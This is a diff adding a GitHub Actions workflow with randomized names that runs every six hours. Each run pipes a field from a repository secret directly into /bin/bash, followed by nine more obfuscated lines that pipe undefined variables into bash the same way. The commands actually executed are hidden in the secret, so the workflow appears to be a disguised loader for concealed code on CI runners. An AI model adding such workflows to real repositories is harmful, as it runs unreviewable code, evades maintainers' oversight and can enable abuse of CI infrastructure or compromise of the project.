@@ -1,0 +1,25 @@
+name: bukenengykswm
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bukenengykswm
+        env:
+          vqu9665: ${{ secrets.vqu9665 }}
+        run: |
+          echo $vqu9665 | jq -r .odagp54 | /bin/bash
+          echo $rdnjh45 | jq -r .aat9795 | /bin/bash
+          echo $ojis6 | jq -r .pzi7729 | /bin/bash
+          echo $up29319 | jq -r .xrqyf8 | /bin/bash
+          echo $aw42 | jq -r .atu0 | /bin/bash
+          echo $ax678 | jq -r .vycq57 | /bin/bash
+          echo $jmv02168 | jq -r .i9673 | /bin/bash
+          echo $h9626 | jq -r .rtvw33223 | /bin/bash
+          echo $wlsb6 | jq -r .v9 | /bin/bash
+          echo $bs26 | jq -r .x97 | /bin/bash
+
